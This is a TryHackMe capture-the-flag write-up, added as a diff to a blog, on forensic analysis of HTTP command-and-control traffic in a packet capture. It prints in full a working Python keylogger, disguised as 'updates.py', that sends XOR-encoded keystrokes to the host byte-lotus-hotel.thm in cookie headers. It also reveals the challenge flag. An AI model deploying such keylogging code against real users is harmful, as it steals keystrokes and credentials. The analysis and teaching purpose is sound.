@@ -1,0 +1,288 @@
+---
+slug: "thm-packed-light"
+title: "Packed Light — TryHackMe Challenge Writeup"
+date: "2026-07-31"
+platform: "TryHackMe"
+type: "Challenge"
+category: "Network Forensics"
+difficulty: "Easy"
+tags:
+  - "Network Forensics"
+  - "PCAP Analysis"
+  - "Wireshark"
+  - "C2 Traffic"
+  - "Python Reverse Engineering"
+  - "XOR Encryption"
+  - "Keylogger"
+excerpt: "A TryHackMe Network Forensics challenge involving PCAP inspection of HTTP C2 traffic, extracting a Python keylogger C2 script, reverse engineering its XOR encryption quirk, and recovering the keystroke stream from HTTP cookie headers — plus an automated Python solver script."
+readTime: "7 min"
+rating: 3
+hasAutoScript: true
+url: "https://asbawy.github.io/writeups/thm-packed-light"
+---
+
+import { Callout } from "@/components/Callout";
+import { SpoilerFlag } from "@/components/cyber/WriteupComponents";
+import { TerminalReplay } from "@/components/cyber/TerminalReplay";
+
+## Initial Inspection
+
+We start by analyzing the provided packet capture file, `traffic.pcapng`, using Wireshark or `tshark` to understand the network activity and identify any suspicious communications.
+
+### Protocol Hierarchy & HTTP Activity
+
+Checking the protocol hierarchy reveals a small amount of HTTP traffic amidst background network chatter:
+
+```bash
+tshark -r traffic.pcapng -q -z io,phs
+```
+
+Filtering specifically for HTTP request methods and target URIs reveals an interesting interaction between the local machine (`192.168.1.141`) and an external server (`34.41.103.191` / `byte-lotus-hotel.thm:8080`):
+
+```bash
+tshark -r traffic.pcapng -Y "http.request" -T fields -e frame.number -e ip.src -e ip.dst -e http.request.method -e http.host -e http.request.uri
+```
+
+**Output:**
+
+```text
+16      192.168.1.141   34.41.103.191   GET     byte-lotus-hotel.thm:8080       /temp/updates.py
+391     192.168.1.141   34.41.103.191   GET     byte-lotus-hotel.thm:8080       /
+428     192.168.1.141   34.41.103.191   GET     byte-lotus-hotel.thm:8080       /
+520     192.168.1.141   34.41.103.191   GET     byte-lotus-hotel.thm:8080       /
+585     192.168.1.141   34.41.103.191   GET     byte-lotus-hotel.thm:8080       /
+619     192.168.1.141   34.41.103.191   GET     byte-lotus-hotel.thm:8080       /
+...
+```
+
+<Callout type="info">
+  **Key Observation:** The victim machine initially fetches a Python script (`/temp/updates.py`) in
+  packet 16, followed immediately by 30 periodic GET requests to `/`. This pattern strongly suggests
+  a Command and Control (C2) agent staging an initial payload and subsequently exfiltrating data.
+</Callout>
+
+---
+
+## Extracting the C2 Payload
+
+### Inspecting Packet 19
+
+Packet 19 contains the HTTP `200 OK` response from `byte-lotus-hotel.thm:8080` for `/temp/updates.py`. We can dump the HTTP response body using `tshark`:
+
+```bash
+tshark -r traffic.pcapng -Y "frame.number==19" -T fields -e http.file_data
+```
+
+The response payload is sent as plaintext Python code in the HTTP response:
+
+```python
+import requests
+import base64
+from pynput import keyboard
+
+C2_URL = "http://byte-lotus-hotel.thm:8080/"
+
+def getkey():
+    p1 = "H0t3lSt@ff0Nly"
+    p2 = "K3epS3cr3t!"
+    return p1 + p2
+
+def xor(data: bytes, key: bytes) -> bytes:
+    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+
+def sendltr(character):
+    raw_bytes = character.encode('utf-8')
+    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
+
+    b64_string = base64.b64encode(encrypted).decode('utf-8')
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
+        "Cookie": f"hotel_sess_state={b64_string}"
+    }
+    try:
+        requests.get(C2_URL, headers=headers, timeout=0.5)
+    except:
+        pass
+
+def on_press(key):
+    try:
+        sendltr(key.char)
+    except AttributeError:
+        if key == keyboard.Key.space:
+            sendltr(" ")
+        elif key == keyboard.Key.enter:
+            sendltr("\n")
+
+print("[*] Byte Lotus Sync Service started...")
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+```
+
+---
+
+## Reverse Engineering the Keylogger
+
+Analyzing `updates.py` reveals how the keystrokes are captured, encrypted, and exfiltrated:
+
+1. **Keystroke Hooking:** Uses `pynput.keyboard.Listener` to intercept every key pressed by the user.
+2. **Encryption Key:** The function `getkey()` concatenates two strings to form the XOR key: `"H0t3lSt@ff0NlyK3epS3cr3t!"`.
+3. **Data Exfiltration:** Each character is passed to `sendltr()`, encrypted via `xor()`, base64-encoded, and sent via an HTTP GET request inside the `Cookie: hotel_sess_state=<base64>` header.
+
+<Callout type="warning">
+  **The Encryption Quirk (Cryptanalysis):** Look closely at `xor(data, key)` when called from
+  `sendltr(character)`. Because `sendltr()` encrypts keystrokes **one character at a time**, the
+  length of `data` is always `1`. Consequently, `i` in `enumerate(data)` is always `0`. This means
+  **every single keystroke is XORed against only the first character of the key**, which is `'H'`
+  (`ord('H') = 0x48`).
+</Callout>
+
+---
+
+## Reconstructing the Keystroke Stream
+
+### Extracting HTTP Cookies
+
+We can list all `hotel_sess_state` cookie values from the 30 subsequent HTTP GET requests in the packet capture:
+
+```bash
+tshark -r traffic.pcapng -Y "http.cookie" -T fields -e frame.number -e http.cookie
+```
+
+**Output:**
+
+```text
+391     hotel_sess_state=HA==
+428     hotel_sess_state=AA==
+520     hotel_sess_state=BQ==
+585     hotel_sess_state=Mw==
+619     hotel_sess_state=Hg==
+707     hotel_sess_state=ew==
+740     hotel_sess_state=Og==
+790     hotel_sess_state=fA==
+815     hotel_sess_state=Fw==
+840     hotel_sess_state=eQ==
+868     hotel_sess_state=Ow==
+907     hotel_sess_state=Fw==
+932     hotel_sess_state=Pw==
+961     hotel_sess_state=fA==
+990     hotel_sess_state=PA==
+1019    hotel_sess_state=Kw==
+1038    hotel_sess_state=IA==
+1056    hotel_sess_state=eQ==
+1076    hotel_sess_state=Jg==
+1094    hotel_sess_state=Lw==
+1114    hotel_sess_state=Fw==
+1132    hotel_sess_state=eA==
+1150    hotel_sess_state=Pg==
+1168    hotel_sess_state=LQ==
+1190    hotel_sess_state=Gg==
+1220    hotel_sess_state=Fw==
+1240    hotel_sess_state=MQ==
+1260    hotel_sess_state=eA==
+1278    hotel_sess_state=PQ==
+1300    hotel_sess_state=NQ==
+```
+
+### Writing the Decryption Script
+
+We write a quick Python snippet to base64-decode each cookie and XOR the resulting byte with `0x48` (`'H'`):
+
+```python
+import base64
+
+cookies = [
+    'HA==', 'AA==', 'BQ==', 'Mw==', 'Hg==', 'ew==', 'Og==', 'fA==',
+    'Fw==', 'eQ==', 'Ow==', 'Fw==', 'Pw==', 'fA==', 'PA==', 'Kw==',
+    'IA==', 'eQ==', 'Jg==', 'Lw==', 'Fw==', 'eA==', 'Pg==', 'LQ==',
+    'Gg==', 'Fw==', 'MQ==', 'eA==', 'PQ==', 'NQ=='
+]
+
+flag = ""
+for c in cookies:
+    raw = base64.b64decode(c)
+    flag += chr(raw[0] ^ ord('H'))
+
+print(f"[+] Recovered Flag: {flag}")
+```
+
+**Execution Output:**
+
+```text
+[+] Recovered Flag: THM{FLAG}
+```
+
+---
+
+## Flag Capture
+
+<SpoilerFlag label="TryHackMe Challenge Flag" flag="THM{V3r4_1s_w4tch1ng_0veR_y0u}" />
+
+---
+
+## Automation
+
+This entire challenge — from parsing the PCAPNG file to extracting the C2 staging payload, cryptanalyzing the XOR keylogger, and decrypting the exfiltrated keystrokes — can be fully automated. Instead of running each step manually, here's an interactive demo of the standalone Python solver script in action:
+
+<TerminalReplay
+  title="packed_light_solve.py"
+  flag="THM{V3r4_1s_w4tch1ng_0veR_y0u}"
+  flagSummary={[
+    "Single-byte XOR keystroke encryption broken using C2 key ('H', 0x48).",
+    "Fully reconstructed exfiltrated USB keystroke stream.",
+  ]}
+  steps={[
+    {
+      label: "Step 1/4 — Inspect PCAP & Verify File",
+      command: "python3 packed_light_solve.py --pcap traffic.pcapng",
+      output: [
+        { text: "[*] Step 1/4: Inspecting PCAP file: traffic.pcapng...", color: "blue" },
+        { text: "[✓] Loaded traffic.pcapng (543.10 KB)", color: "green" },
+      ],
+      delayAfter: 600,
+    },
+    {
+      label: "Step 2/4 — Extract & Decode C2 Stage (/temp/updates.py)",
+      output: [
+        { text: "[*] Step 2/4: Extracting C2 staging script (/temp/updates.py)...", color: "blue" },
+        { text: "[✓] Extracted script (1085 bytes)", color: "green" },
+        { text: "[✓] Identified C2 XOR Key: H0t3lSt@ff0NlyK3epS3cr3t!", color: "green" },
+        { text: "[!] Cryptanalysis: sendltr() encrypts characters individually.", color: "magenta" },
+        { text: "[!] Because len(data) == 1, index i=0 always -> XOR byte is key[0] ('H', 0x48)", color: "magenta" },
+      ],
+      delayAfter: 800,
+    },
+    {
+      label: "Step 3/4 — Harvest Exfiltrated Cookies",
+      output: [
+        { text: "[*] Step 3/4: Harvesting exfiltrated 'hotel_sess_state' cookies...", color: "blue" },
+        { text: "[✓] Harvested 30 encrypted keystroke cookies", color: "green" },
+        { text: "    Sample: HA==, AA==, BQ==, Mw==, Hg==, ew==...", color: "cyan" },
+      ],
+      delayAfter: 600,
+    },
+    {
+      label: "Step 4/4 — Decrypt Keystrokes & Capture Flag",
+      output: [
+        { text: "[*] Step 4/4: Decrypting keystroke stream...", color: "blue" },
+        { text: "[✓] Keystroke stream successfully reconstructed!", color: "green" }
+      ],
+      delayAfter: 800,
+    },
+  ]}
+/>
+
+<Callout type="tip">
+  **Standalone Solver Script:** View or download the complete automated Python exploit script
+  [`thm_packed_light_solve.py`](https://github.com/Asbawy/Asbawy.github.io/blob/main/autosolve/thm_packed_light_solve.py)
+  in our [`/autosolve`](https://github.com/Asbawy/Asbawy.github.io/tree/main/autosolve) directory.
+</Callout>
+
+---
+
+## References
+
+- [Wireshark — HTTP Display Filters](https://www.wireshark.org/docs/dfref/h/http.html)
+- [Python `pynput` Documentation](https://pynput.readthedocs.io/en/latest/keyboard.html)
+- [XOR Cipher Cryptanalysis & Quirks](https://en.wikipedia.org/wiki/XOR_cipher)
+- [RFC 6265 — HTTP State Management Mechanism (Cookies)](https://datatracker.ietf.org/doc/html/rfc6265)
